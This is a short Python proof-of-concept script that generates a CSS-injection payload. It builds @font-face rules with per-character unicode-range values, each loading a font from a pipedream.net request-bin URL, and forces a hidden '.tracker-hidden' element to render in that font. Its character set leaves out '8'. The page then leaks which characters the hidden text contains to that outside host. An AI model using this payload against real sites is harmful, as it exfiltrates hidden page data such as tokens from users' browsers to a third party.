

a = "012345679ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


for c in a:
    print("@font-face{{ font-family:poc; src: url(https://7e695058bd430b379699858be84c3f34.m.pipedream.net/{});  unicode-range:U+00{}; }}".format(c,hex(ord(c))[2:]))
print(".tracker-hidden{ font-family:poc; display:block !important;  }")
